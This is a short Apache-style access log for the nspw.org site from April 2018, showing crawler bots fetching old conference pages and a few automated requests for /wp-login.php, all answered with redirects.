www.nspw.org:80 216.244.66.200 - - [25/Apr/2018:12:24:55 -0400] "GET /2008/nspw-header.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:24:58 -0400] "GET /2008/nspw2008-cfpTwk.html HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 93.87.220.197 - - [25/Apr/2018:12:24:59 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 93.87.220.197 - - [25/Apr/2018:12:25:00 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.200 - - [25/Apr/2018:12:25:05 -0400] "GET /2008/index.content HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:25:20 -0400] "GET /2008/oc.content.2007 HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:25:42 -0400] "GET /2008/oc.content.2008 HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:26:03 -0400] "GET /2008/panel.htmlQQ HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 216.244.66.200 - - [25/Apr/2018:12:26:23 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:26:25 -0400] "GET /2008/past.content HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:26:47 -0400] "GET /2008/pc.content HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 54.36.148.56 - - [25/Apr/2018:12:27:07 -0400] "GET /2009/index.html HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:27:09 -0400] "GET /2008/pc.content.2008 HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 81.224.98.29 - - [25/Apr/2018:12:27:12 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 81.224.98.29 - - [25/Apr/2018:12:27:13 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:27:31 -0400] "GET /2008/registration.content.2007 HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:27:53 -0400] "GET /2008/submission.content HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 212.15.177.136 - - [25/Apr/2018:12:27:56 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 212.15.177.136 - - [25/Apr/2018:12:27:57 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:28:14 -0400] "GET /2009/invite-old/ HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 216.244.66.200 - - [25/Apr/2018:12:28:18 -0400] "GET /papers/1998/?C=D;O=D HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:28:36 -0400] "GET /2009/invite-old/local.html HTTP/1.1" 302 525 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
